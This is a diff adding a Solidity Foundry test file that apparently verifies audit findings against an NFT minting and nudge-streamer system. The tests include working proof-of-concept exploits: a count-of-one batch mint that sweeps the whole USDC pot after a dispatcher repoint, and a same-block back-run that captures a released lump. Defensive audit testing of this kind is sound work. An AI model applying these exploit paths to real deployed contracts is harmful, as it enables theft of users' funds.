@@ -1,0 +1,642 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+// =============================================================================
+// run-19 Tier-3 empirical verification (yield-claim-nft @ d4cc563)
+//
+// Targets:
+//   T1  CODE-002  payment-token collision sweep       -> Run19_T1_PaymentTokenCollision
+//   T2  CODE-001  NudgeRatchet wedge + no rescue      -> Run19_T2_RatchetWedge
+//   T3  PATTERN-001 buffer residency measurement      -> Run19_T3_BufferResidency
+//   T4  CODE-003  DelayRelease release() back-run     -> Run19_T4_DelayReleaseBackrun
+//
+// ANTI-VACUITY POLICY (see the vacuous-harness lesson): every test below seeds
+// REAL guarded state through the REAL production contracts (NudgeStreamer,
+// BatchNFTMinterMultiToken, NFTMinterV2 and the real dispatchers) and asserts a
+// non-zero precondition BEFORE asserting the property. Each test carries an
+// explicit `_tripwire*` assertion that fails loudly if the exercised path never
+// actually moved value.
+// =============================================================================
+
+import {Test} from "forge-std/Test.sol";
+import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
+import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+
+import {NFTMinterV2} from "../src/NFTMinterV2.sol";
+import {NudgeRatchet} from "../src/dispatchers/NudgeRatchet.sol";
+import {NudgeRatchetDelayRelease} from "../src/dispatchers/NudgeRatchetDelayRelease.sol";
+import {Uniboost} from "../src/dispatchers/Uniboost.sol";
+import {GatherV2} from "../src/dispatchers/GatherV2.sol";
+import {NudgeRatchetMintDebtHook} from "../src/hooks/NudgeRatchetMintDebtHook.sol";
+import {IDispatchHook} from "../src/interfaces/IDispatchHook.sol";
+import {MockMintable} from "./mocks/MockMintable.sol";
+
+import {NudgeStreamer} from "phoenix-nft-staking/NudgeStreamer.sol";
+import {BatchNFTMinterMultiToken} from "phoenix-nft-staking/BatchNFTMinterMultiToken.sol";
+import {ITokenMinterV2 as IStakingTokenMinterV2} from "yield-claim-nft/interfaces/ITokenMinterV2.sol";
+
+/// @dev 6-dp USDC stand-in with an optional blacklist, used to model the real USDC
+///      blacklist as a third-party trigger (T2c). With nobody blacklisted it behaves
+///      exactly like a plain 6-dp ERC20.
+contract MockUSDC6BL is ERC20 {
+    mapping(address => bool) public blacklisted;
+
+    constructor() ERC20("USD Coin", "USDC") {}
+
+    function decimals() public pure override returns (uint8) {
+        return 6;
+    }
+
+    function mint(address to, uint256 amount) external {
+        _mint(to, amount);
+    }
+
+    function setBlacklisted(address who, bool v) external {
+        blacklisted[who] = v;
+    }
+
+    function _update(address from, address to, uint256 value) internal override {
+        require(!blacklisted[from], "USDC: sender blacklisted");
+        require(!blacklisted[to], "USDC: recipient blacklisted");
+        super._update(from, to, value);
+    }
+}
+
+contract MockPayToken is ERC20 {
+    constructor() ERC20("Pay", "PAY") {}
+
+    function mint(address to, uint256 amount) external {
+        _mint(to, amount);
+    }
+}
+
+contract MockUniV2PairStub {
+    address public token0;
+    address public token1;
+
+    constructor(address t0, address t1) {
+        token0 = t0;
+        token1 = t1;
+    }
+}
+
+// -----------------------------------------------------------------------------
+// Shared real-stack harness (wiring mirrors test/integration/NudgeStreamerDonorIntegration.t.sol)
+// -----------------------------------------------------------------------------
+abstract contract Run19Base is Test {
+    NudgeStreamer internal streamer;
+    BatchNFTMinterMultiToken internal batch;
+    NFTMinterV2 internal nftMinter;
+    NudgeRatchet internal ratchet;
+    Uniboost internal uniboost;
+    GatherV2 internal payDispatcher;
+    NudgeRatchetMintDebtHook internal ratchetHook;
+
+    MockUSDC6BL internal usdc;
+    MockPayToken internal payToken;
+    MockMintable internal phUSD;
+    MockUniV2PairStub internal uniPool;
+    ERC20 internal boostTarget;
+
+    address internal owner = address(this);
+    address internal nftRecipient = address(0xFACE);
+    address internal treasury = address(0xFEE5);
+    address internal constant ROUTER_STUB = address(0x2011);
+
+    uint256 internal constant RATCHET_INDEX = 1; // USDC-prime
+    uint256 internal constant UNIBOOST_INDEX = 2; // USDC-prime
+    uint256 internal constant PAY_INDEX = 7; // PAY-prime (the "safe" pinned index)
+    uint256 internal constant RATCHET_PRICE = 10e6; // 10 USDC per mint
+    uint256 internal constant MINT_PRICE = 1e18; // PAY per mint
+    uint256 internal constant NUDGE_SIZE = 5;
+    uint256 internal STREAM_DURATION = 1000;
+
+    function _deployStack() internal {
+        usdc = new MockUSDC6BL();
+        payToken = new MockPayToken();
+        phUSD = new MockMintable();
+        boostTarget = new MockPayToken();
+
+        nftMinter = new NFTMinterV2(owner);
+
+        ratchet = new NudgeRatchet(address(usdc), address(0xDEAD), owner);
+        ratchetHook = new NudgeRatchetMintDebtHook(owner, address(ratchet), address(phUSD));
+        ratchet.setHook(IDispatchHook(address(ratchetHook)));
+        ratchet.setMinter(address(nftMinter));
+
+        uniPool = new MockUniV2PairStub(address(boostTarget), address(payToken));
+        uniboost = new Uniboost(address(usdc), ROUTER_STUB, address(uniPool), address(boostTarget), owner);
+        uniboost.setMinter(address(nftMinter));
+
+        payDispatcher = new GatherV2(address(payToken), treasury, owner);
+        payDispatcher.setMinter(address(nftMinter));
+
+        nftMinter.registerDispatcher(address(ratchet), RATCHET_PRICE, 0); // index 1
+        nftMinter.registerDispatcher(address(uniboost), RATCHET_PRICE, 0); // index 2
+        for (uint256 i = 3; i < PAY_INDEX; ++i) {
+            nftMinter.registerDispatcher(address(uint160(0x1000 + i)), 1, 0);
+        }
+        nftMinter.registerDispatcher(address(payDispatcher), MINT_PRICE, 0); // index 7
+
+        batch = new BatchNFTMinterMultiToken(owner);
+        streamer = new NudgeStreamer(owner);
+
+        batch.setTokenMinter(IStakingTokenMinterV2(address(nftMinter)));
+        batch.setDispatcherIndex(PAY_INDEX);
+        batch.setNudgeSize(NUDGE_SIZE);
+        batch.setNudgeTokenWhitelist(address(usdc), true);
+        batch.setNudgeStreamer(address(streamer));
+
+        streamer.registerStream(address(batch), address(usdc), STREAM_DURATION);
+
+        ratchet.setNudgeStreamer(address(streamer));
+        ratchet.setBatchMinter(address(batch));
+        uniboost.setNudgeStreamer(address(streamer));
+        uniboost.setRecipient(address(batch));
+        uniboost.setDonationSplit(100);
+    }
+
+    function _mins(uint256 value) internal pure returns (uint256[] memory arr) {
+        arr = new uint256[](1);
+        arr[0] = value;
+    }
+
+    /// @dev Real user mint on the ratchet index: USDC -> NFTMinterV2 -> ratchet -> streamer.
+    function _mintThroughRatchet(address user) internal {
+        usdc.mint(user, RATCHET_PRICE);
+        vm.startPrank(user);
+        usdc.approve(address(nftMinter), RATCHET_PRICE);
+        nftMinter.mint(RATCHET_INDEX, user);
+        vm.stopPrank();
+    }
+}
+
+// =============================================================================
+// T1 — CODE-002: payment-token collision converts the nudge pot into an ungated
+//      sweep to whoever calls batchMint next, with count = 1.
+// =============================================================================
+contract Run19_T1_PaymentTokenCollision is Run19Base {
+    address internal attacker = address(0xA77AC);
+
+    function setUp() public {
+        _deployStack();
+    }
+
+    /// @dev CONTROL. Before the repoint, USDC is a genuine nudge token: a count=1
+    ///      batch does NOT qualify, pays nothing out, and sweeps nothing, because the
+    ///      payment token is PAY and the USDC pot is untouched.
+    function test_T1_control_beforeRepoint_count1_capturesNothing() public {
+        uint256 pot = _accumulatePot();
+        assertGt(pot, 0, "TRIPWIRE: pot must be non-empty before the control run");
+
+        payToken.mint(attacker, MINT_PRICE);
+        vm.startPrank(attacker);
+        payToken.approve(address(batch), MINT_PRICE);
+        batch.batchMint(1, attacker, MINT_PRICE, _mins(0));
+        vm.stopPrank();
+
+        assertEq(usdc.balanceOf(attacker), 0, "control: no USDC leaks to a count=1 batcher");
+        assertGe(usdc.balanceOf(address(batch)), pot, "control: pot stays in the minter");
+    }
+
+    /// @dev THE EXPLOIT. One owner tx (`setDispatcherIndex` -> a USDC-prime dispatcher)
+    ///      turns the whitelisted nudge token into the derived payment token. An
+    ///      unprivileged caller then mints ONE NFT and walks away with the entire pot.
+    function test_T1_afterRepoint_count1_sweepsWholePot() public {
+        uint256 pot = _accumulatePot();
+        assertGt(pot, 0, "TRIPWIRE: pot must be non-empty");
+
+        // ---- the single owner transaction ----
+        batch.setDispatcherIndex(RATCHET_INDEX); // USDC-prime dispatcher
+        // Precondition proof: the derived payment token is now the whitelisted nudge token.
+        (address disp,,,) = nftMinter.configs(RATCHET_INDEX);
+        assertEq(disp, address(ratchet), "index 1 is the USDC-prime NudgeRatchet");
+        assertTrue(batch.isNudgeToken(address(usdc)), "USDC is still whitelisted as a nudge token");
+
+        uint256 potAtAttack = usdc.balanceOf(address(batch)) + streamer.pendingStream(address(batch), address(usdc));
+        assertGt(potAtAttack, RATCHET_PRICE, "TRIPWIRE: pot must exceed one mint's cost");
+
+        // ---- unprivileged caller, count = 1, ONE WEI of payment budget ----
+        // The mint itself is funded out of the pot the contract already holds, because
+        // step 6 grants the minter an unbounded allowance over the whole balance.
+        usdc.mint(attacker, 1);
+        uint256 attackerBefore = usdc.balanceOf(attacker);
+
+        vm.startPrank(attacker);
+        usdc.approve(address(batch), 1);
+        batch.batchMint(1, attacker, 1, _mins(0));
+        vm.stopPrank();
+
+        uint256 extracted = usdc.balanceOf(attacker) - attackerBefore;
+
+        // The attacker paid 1 wei and received (pot - one mint's price) plus an NFT.
+        // Net of the 1 wei they supplied: pot minus the one mint the pot itself funded.
+        assertEq(extracted, potAtAttack - RATCHET_PRICE, "attacker sweeps the whole pot less one mint price");
+        assertGt(extracted, 0, "TRIPWIRE: value must actually have moved");
+        assertEq(nftMinter.balanceOf(attacker, RATCHET_INDEX), 1, "and keeps the NFT the pot paid for");
+        assertEq(usdc.balanceOf(address(batch)), 0, "batch-minter drained of the nudge token");
+
+        emit log_named_uint("T1 pot at attack (USDC 6dp)", potAtAttack);
+        emit log_named_uint("T1 extracted by count=1 caller", extracted);
+        emit log_named_uint("T1 attacker payment budget supplied", 1);
+    }
+
+    /// @dev The nudgeSize gate is bypassed: count(1) < nudgeSize(5), so `qualifies`
+    ///      is false and `_payRewards` pays nothing — yet the funds still leave.
+    function test_T1_nudgeSizeGateIsBypassed() public {
+        _accumulatePot();
+        batch.setDispatcherIndex(RATCHET_INDEX);
+        assertEq(batch.nudgeSize(), NUDGE_SIZE, "gate is configured");
+
+        usdc.mint(attacker, 1);
+        vm.startPrank(attacker);
+        usdc.approve(address(batch), 1);
+        batch.batchMint(1, attacker, 1, _mins(0));
+        vm.stopPrank();
+
+        // `recipient` (the designated nudge beneficiary path) got nothing; the *caller*
+        // got everything, via the step-10 dust sweep rather than the payout pass.
+        assertGt(usdc.balanceOf(attacker), 0, "caller captured value");
+        assertEq(nftMinter.balanceOf(nftRecipient, RATCHET_INDEX), 0, "no nudge payout path ran");
+    }
+
+    /// @dev It refills and is repeatable: donors keep feeding `collectNudge`.
+    function test_T1_repeatableAsThePotRefills() public {
+        _accumulatePot();
+        batch.setDispatcherIndex(RATCHET_INDEX);
+
+        usdc.mint(attacker, 2);
+        vm.startPrank(attacker);
+        usdc.approve(address(batch), type(uint256).max);
+        batch.batchMint(1, attacker, 1, _mins(0));
+        uint256 firstTake = usdc.balanceOf(attacker);
+        vm.stopPrank();
+
+        // Honest users keep minting; donations keep flowing into the same stream.
+        for (uint256 i; i < 10; ++i) {
+            _mintThroughRatchet(address(uint160(0xB000 + i)));
+        }
+        vm.warp(block.timestamp + STREAM_DURATION);
+
+        uint256 refilled = streamer.pendingStream(address(batch), address(usdc));
+        assertGt(refilled, 0, "TRIPWIRE: pot must have refilled");
+
+        vm.prank(attacker);
+        batch.batchMint(1, attacker, 1, _mins(0));
+        assertGt(usdc.balanceOf(attacker), firstTake, "second sweep captured the refill");
+        emit log_named_uint("T1 second sweep (refill captured)", usdc.balanceOf(attacker) - firstTake);
+    }
+
+    /// @dev Seed the pot the way production does: real mints through the real ratchet
+    ///      into the real streamer, then let the window elapse so it is claimable.
+    ///      Returns the batch-minter's USDC balance after a flush.
+    function _accumulatePot() internal returns (uint256) {
+        for (uint256 i; i < 20; ++i) {
+            _mintThroughRatchet(address(uint160(0xA000 + i)));
+        }
+        (, uint256 buffer,,) = streamer.streams(address(batch), address(usdc));
+        assertEq(buffer, 20 * RATCHET_PRICE, "TRIPWIRE: donors really funded the stream");
+
+        vm.warp(block.timestamp + STREAM_DURATION);
+        assertEq(
+            streamer.pendingStream(address(batch), address(usdc)),
+            20 * RATCHET_PRICE,
+            "TRIPWIRE: whole donation is claimable"
+        );
+
+        // Flush it onto the batch-minter (any batchMint would do this at step 3.5).
+        vm.prank(address(batch));
+        streamer.pullPendingStream(address(usdc));
+        uint256 pot = usdc.balanceOf(address(batch));
+        assertEq(pot, 20 * RATCHET_PRICE, "TRIPWIRE: pot really landed on the batch-minter");
+        return pot;
+    }
+}
+
+// =============================================================================
+// T2 — CODE-001: NudgeRatchet's mandatory streamer wedges the mint, and the USDC
+//      resident on it is unreachable because there is no rescueERC20.
+// =============================================================================
+contract Run19_T2_RatchetWedge is Run19Base {
+    address internal user = address(0x5E41);
+
+    function setUp() public {
+        _deployStack();
+    }
+
+    /// @dev (a) streamer unset — the post-deploy default. Exact revert string.
+    function test_T2a_streamerUnset_revertsWithExactMessage() public {
+        NudgeRatchet fresh = new NudgeRatchet(address(usdc), address(batch), owner);
+        NudgeRatchetMintDebtHook h = new NudgeRatchetMintDebtHook(owner, address(fresh), address(phUSD));
+        fresh.setHook(IDispatchHook(address(h)));
+        fresh.setMinter(address(nftMinter));
+        uint256 idx = nftMinter.nextIndex();
+        nftMinter.registerDispatcher(address(fresh), RATCHET_PRICE, 0);
+        assertEq(fresh.nudgeStreamer(), address(0), "TRIPWIRE: streamer really is unset");
+
+        usdc.mint(user, RATCHET_PRICE);
+        vm.startPrank(user);
+        usdc.approve(address(nftMinter), RATCHET_PRICE);
+        vm.expectRevert(bytes("NudgeRatchet: nudgeStreamer unset"));
+        nftMinter.mint(idx, user);
+        vm.stopPrank();
+
+        assertEq(nftMinter.balanceOf(user, idx), 0, "TRIPWIRE: the whole user mint reverted");
+    }
+
+    /// @dev (b) streamer set but the (batchMinter, token) pair unregistered.
+    ///      Exact custom-error selector NudgeStreamer__NotRegistered().
+    function test_T2b_pairUnregistered_revertsWithExactSelector() public {
+        // Repoint the ratchet at a batchMinter with no registered stream.
+        BatchNFTMinterMultiToken other = new BatchNFTMinterMultiToken(owner);
+        ratchet.setBatchMinter(address(other));
+        (, uint256 durBefore,,) = streamer.streams(address(other), address(usdc));
+        assertEq(durBefore, 0, "TRIPWIRE: the new pair really is unregistered");
+
+        usdc.mint(user, RATCHET_PRICE);
+        vm.startPrank(user);
+        usdc.approve(address(nftMinter), RATCHET_PRICE);
+        vm.expectRevert(NudgeStreamer.NudgeStreamer__NotRegistered.selector);
+        nftMinter.mint(RATCHET_INDEX, user);
+        vm.stopPrank();
+
+        assertEq(nftMinter.balanceOf(user, RATCHET_INDEX), 0, "TRIPWIRE: user mint reverted");
+    }
+
+    /// @dev (c) while wedged, USDC resident on the ratchet is unreachable by ANY actor:
+    ///      no rescueERC20 selector exists, and the only forwarding path is the
+    ///      dispatch that is itself reverting.
+    function test_T2c_residentUsdcIsUnreachable_noRescueSelector() public {
+        // Strand funds: someone transfers USDC to the ratchet out of band (the exact
+        // case the NatSpec's "self-cleaning" argument covers).
+        usdc.mint(address(ratchet), 500e6);
+        assertEq(usdc.balanceOf(address(ratchet)), 500e6, "TRIPWIRE: funds really are resident");
+
+        // Wedge it.
+        BatchNFTMinterMultiToken other = new BatchNFTMinterMultiToken(owner);
+        ratchet.setBatchMinter(address(other));
+
+        // 1. No rescueERC20(address,address,uint256) on the contract at all.
+        bytes memory rescueCall =
+            abi.encodeWithSignature("rescueERC20(address,address,uint256)", address(usdc), owner, 500e6);
+        (bool ok,) = address(ratchet).call(rescueCall);
+        assertFalse(ok, "NudgeRatchet exposes no rescueERC20 (owner call must fail)");
+        // Contrast: the sibling donor DOES have one.
+        NudgeRatchetDelayRelease sibling = new NudgeRatchetDelayRelease(address(usdc), address(batch), owner);
+        usdc.mint(address(sibling), 1e6);
+        (bool ok2,) = address(sibling).call(
+            abi.encodeWithSignature("rescueERC20(address,address,uint256)", address(usdc), owner, 1e6)
+        );
+        assertTrue(ok2, "sibling NudgeRatchetDelayRelease DOES expose rescueERC20");
+
+        // 2. The only forwarding path is dispatch, which is itself reverting.
+        usdc.mint(user, RATCHET_PRICE);
+        vm.startPrank(user);
+        usdc.approve(address(nftMinter), RATCHET_PRICE);
+        vm.expectRevert(NudgeStreamer.NudgeStreamer__NotRegistered.selector);
+        nftMinter.mint(RATCHET_INDEX, user);
+        vm.stopPrank();
+
+        // 3. Owner cannot pause its way out either; funds stay put.
+        assertEq(usdc.balanceOf(address(ratchet)), 500e6, "USDC remains stranded on the ratchet");
+    }
+
+    /// @dev (d) THIRD-PARTY TRIGGER: a USDC blacklist on the STREAMER address bricks
+    ///      every donor that shares it — a failure point that did not exist before
+    ///      story-046 (the legacy leaf transfer touched only donor -> batchMinter).
+    function test_T2d_blacklistOnStreamerBricksEveryDonor() public {
+        // Prove the donors work first (non-vacuity).
+        _mintThroughRatchet(address(0xC0FE));
+        usdc.mint(address(uniboost), 10e6);
+        vm.prank(address(nftMinter));
+        uniboost.dispatch(address(nftMinter), 10e6, "");
+        (, uint256 bufferBefore,,) = streamer.streams(address(batch), address(usdc));
+        assertGt(bufferBefore, 0, "TRIPWIRE: both donors funded the stream before blacklisting");
+
+        // Third party (the token issuer) blacklists the shared streamer.
+        usdc.setBlacklisted(address(streamer), true);
+
+        // Donor 1: NudgeRatchet — reverts, so the whole user mint reverts.
+        usdc.mint(user, RATCHET_PRICE);
+        vm.startPrank(user);
+        usdc.approve(address(nftMinter), RATCHET_PRICE);
+        vm.expectRevert(bytes("USDC: recipient blacklisted"));
+        nftMinter.mint(RATCHET_INDEX, user);
+        vm.stopPrank();
+
+        // Donor 2: Uniboost — same shared streamer, same brick.
+        usdc.mint(address(uniboost), 10e6);
+        vm.prank(address(nftMinter));
+        vm.expectRevert(bytes("USDC: recipient blacklisted"));
+        uniboost.dispatch(address(nftMinter), 10e6, "");
+
+        // And the buffered funds already inside the streamer cannot be settled out
+        // either (the outbound leg is blocked too) — no rescue exists on NudgeStreamer.
+        vm.warp(block.timestamp + STREAM_DURATION);
+        vm.prank(address(batch));
+        vm.expectRevert(bytes("USDC: sender blacklisted"));
+        streamer.pullPendingStream(address(usdc));
+    }
+}
+
+// =============================================================================
+// T3 — PATTERN-001: caller-side rate reset. MEASUREMENT ONLY (no verdict).
+//      Every donor mint calls collectNudge, which recomputes
+//      rewardPerSecond = buffer * 1e18 / duration over the FULL window from now.
+// =============================================================================
+contract Run19_T3_BufferResidency is Run19Base {
+    /// @dev Realistic ops setting: a 7-day stream window.
+    uint256 internal constant WINDOW = 7 days;
+
+    function setUp() public {
+        STREAM_DURATION = WINDOW;
+        _deployStack();
+    }
+
+    function test_T3_residency_hourlyCadence() public {
+        _measure(1 hours, 336, "1h cadence, 336 mints (14 days)");
+    }
+
+    function test_T3_residency_sixHourCadence() public {
+        _measure(6 hours, 56, "6h cadence, 56 mints (14 days)");
+    }
+
+    function test_T3_residency_dailyCadence() public {
+        _measure(1 days, 14, "24h cadence, 14 mints (14 days)");
+    }
+
+    function test_T3_residency_tenMinuteCadence() public {
+        _measure(10 minutes, 2016, "10m cadence, 2016 mints (14 days)");
+    }
+
+    /// @param dt seconds between consecutive donor mints
+    /// @param n  number of mints
+    function _measure(uint256 dt, uint256 n, string memory label) internal {
+        uint256 donated;
+        for (uint256 i; i < n; ++i) {
+            _mintThroughRatchet(address(uint160(0x10000 + i)));
+            donated += RATCHET_PRICE;
+            vm.warp(block.timestamp + dt);
+        }
+
+        // TRIPWIRE: the path must actually have been exercised.
+        assertEq(donated, n * RATCHET_PRICE, "TRIPWIRE: donations really happened");
+        (, uint256 buffer, uint256 rate,) = streamer.streams(address(batch), address(usdc));
+        assertGt(rate, 0, "TRIPWIRE: a real stream rate is configured");
+
+        // Delivered = what the batch-minter actually holds + what is claimable right now.
+        uint256 delivered = usdc.balanceOf(address(batch));
+        uint256 claimableNow = streamer.pendingStream(address(batch), address(usdc));
+        uint256 resident = usdc.balanceOf(address(streamer));
+        assertEq(resident, buffer, "streamer balance == buffer");
+        assertEq(delivered + resident, donated, "conservation: nothing is lost");
+
+        uint256 residentPctE4 = (resident * 10_000) / donated; // basis points
+        uint256 unclaimable = resident - claimableNow;
+
+        emit log_string(label);
+        emit log_named_uint("  total donated (USDC 6dp)", donated);
+        emit log_named_uint("  delivered to batchMinter", delivered);
+        emit log_named_uint("  resident in streamer", resident);
+        emit log_named_uint("  of which claimable now", claimableNow);
+        emit log_named_uint("  of which NOT yet claimable", unclaimable);
+        emit log_named_uint("  residency, basis points of donated", residentPctE4);
+        emit log_named_uint("  steady-state prediction D*duration/dt", (RATCHET_PRICE * WINDOW) / dt);
+
+        // Pre-change behaviour was an immediate safeTransfer of the full donation:
+        // delivered == donated at every instant. The shortfall vs that baseline is
+        // exactly `resident`.
+        emit log_named_uint("  shortfall vs pre-change immediate transfer", donated - delivered);
+    }
+
+    /// @dev Horizon sweep at a fixed (daily) cadence. Shows that the resident buffer
+    ///      converges on ONE window's worth of inflow (rate * duration) — a first-order
+    ///      lag with time constant == `duration` — so residency as a FRACTION of
+    ///      cumulative donations decays like duration/T, and is cadence-independent.
+    function test_T3_residencyVsHorizon_dailyCadence() public {
+        uint256 dt = 1 days;
+        uint256 donated;
+        uint256[4] memory horizons = [uint256(7), 14, 28, 56]; // days == 1x, 2x, 4x, 8x window
+        uint256 h;
+        for (uint256 k; k < horizons.length; ++k) {
+            for (; h < horizons[k]; ++h) {
+                _mintThroughRatchet(address(uint160(0x30000 + h)));
+                donated += RATCHET_PRICE;
+                vm.warp(block.timestamp + dt);
+            }
+            uint256 resident = usdc.balanceOf(address(streamer));
+            assertGt(resident, 0, "TRIPWIRE: residency non-zero");
+            emit log_named_uint("horizon (windows)", horizons[k] * 1 days / WINDOW);
+            emit log_named_uint("  donated", donated);
+            emit log_named_uint("  resident", resident);
+            emit log_named_uint("  residency bps of donated", (resident * 10_000) / donated);
+            emit log_named_uint("  resident as bps of one-window inflow", (resident * 10_000) / ((RATCHET_PRICE * WINDOW) / dt));
+        }
+    }
+
+    /// @dev The tail: once donations stop, does the resident buffer fully drain?
+    ///      (Distinguishes "smoothing lag" from "permanently stranded value".)
+    function test_T3_tailDrainsFullyAfterDonationsStop() public {
+        for (uint256 i; i < 200; ++i) {
+            _mintThroughRatchet(address(uint160(0x20000 + i)));
+            vm.warp(block.timestamp + 1 hours);
+        }
+        uint256 resident = usdc.balanceOf(address(streamer));
+        assertGt(resident, 0, "TRIPWIRE: residency exists to drain");
+
+        vm.warp(block.timestamp + WINDOW + 1);
+        vm.prank(address(batch));
+        streamer.pullPendingStream(address(usdc));
+
+        assertEq(usdc.balanceOf(address(streamer)), 0, "buffer fully drains one window after the last deposit");
+        emit log_named_uint("T3 tail drained (USDC 6dp)", resident);
+    }
+}
+
+// =============================================================================
+// T4 — CODE-003: NudgeRatchetDelayRelease.release() is a visible mempool tx doing
+//      a direct lump safeTransfer; batchMint snapshots pre-loop, so a back-runner
+//      takes the whole lump.
+// =============================================================================
+contract Run19_T4_DelayReleaseBackrun is Run19Base {
+    NudgeRatchetDelayRelease internal delayRelease;
+    address internal releaser = address(0x4E11);
+    address internal searcher = address(0x5EA4);
+    address internal honest = address(0x400D);
+    uint256 internal constant LUMP = 50_000e6; // 50k USDC admin-timed release
+
+    function setUp() public {
+        _deployStack();
+        delayRelease = new NudgeRatchetDelayRelease(address(usdc), address(batch), owner);
+        delayRelease.setReleaser(releaser, true);
+        // The delay-release donor holds USDC accumulated from its own dispatches.
+        usdc.mint(address(delayRelease), LUMP);
+    }
+
+    /// @dev The lump is captured whole by whoever batches immediately after `release()`
+    ///      in the same block — exactly the burst-capture NudgeStreamer was built to stop.
+    function test_T4_searcherBackrunsReleaseAndTakesTheWholeLump() public {
+        assertEq(usdc.balanceOf(address(batch)), 0, "TRIPWIRE: pot starts empty");
+
+        // --- the visible mempool transaction ---
+        vm.prank(releaser);
+        delayRelease.release(LUMP);
+        assertEq(usdc.balanceOf(address(batch)), LUMP, "TRIPWIRE: lump landed directly on the batch-minter");
+
+        // --- back-run, SAME block (no vm.warp) ---
+        uint256 cost = NUDGE_SIZE * MINT_PRICE;
+        payToken.mint(searcher, cost);
+        vm.startPrank(searcher);
+        payToken.approve(address(batch), cost);
+        batch.batchMint(NUDGE_SIZE, searcher, cost, _mins(LUMP)); // minReward = the whole lump
+        vm.stopPrank();
+
+        assertEq(usdc.balanceOf(searcher), LUMP, "searcher captured 100% of the released lump");
+        assertEq(usdc.balanceOf(address(batch)), 0, "pot emptied in one block");
+        emit log_named_uint("T4 lump captured (USDC 6dp)", LUMP);
+        emit log_named_uint("T4 searcher cost (PAY 18dp)", cost);
+    }
+
+    /// @dev CONTRAST: the same value routed through the streamer is NOT capturable in
+    ///      one block — only the accrued sliver is. This is the invariant the four
+    ///      streamed donors uphold and DelayRelease does not.
+    function test_T4_contrast_streamedDonorIsNotBurstCapturable() public {
+        // Same lump, but via the streamer (as the other four donors do).
+        usdc.mint(address(ratchet), LUMP);
+        vm.prank(address(nftMinter));
+        ratchet.dispatch(address(nftMinter), LUMP, "");
+        assertEq(usdc.balanceOf(address(streamer)), LUMP, "TRIPWIRE: lump buffered in the streamer");
+
+        uint256 cost = NUDGE_SIZE * MINT_PRICE;
+        payToken.mint(searcher, cost);
+        vm.startPrank(searcher);
+        payToken.approve(address(batch), cost);
+        batch.batchMint(NUDGE_SIZE, searcher, cost, _mins(0));
+        vm.stopPrank();
+
+        assertEq(usdc.balanceOf(searcher), 0, "same-block back-run captures nothing from a streamed donor");
+        assertGe(usdc.balanceOf(address(streamer)), LUMP - 1, "value still buffered for later claimants");
+    }
+
+    /// @dev The honest batcher who would otherwise have shared the pot gets nothing.
+    function test_T4_honestBatcherIsFrontRunOut() public {
+        vm.prank(releaser);
+        delayRelease.release(LUMP);
+
+        uint256 cost = NUDGE_SIZE * MINT_PRICE;
+        payToken.mint(searcher, cost);
+        vm.startPrank(searcher);
+        payToken.approve(address(batch), cost);
+        batch.batchMint(NUDGE_SIZE, searcher, cost, _mins(0));
+        vm.stopPrank();
+
+        payToken.mint(honest, cost);
+        vm.startPrank(honest);
+        payToken.approve(address(batch), cost);
+        batch.batchMint(NUDGE_SIZE, honest, cost, _mins(0));
+        vm.stopPrank();
+
+        assertEq(usdc.balanceOf(searcher), LUMP, "back-runner took everything");
+        assertEq(usdc.balanceOf(honest), 0, "honest batcher paid mint costs for nothing");
+    }
+}
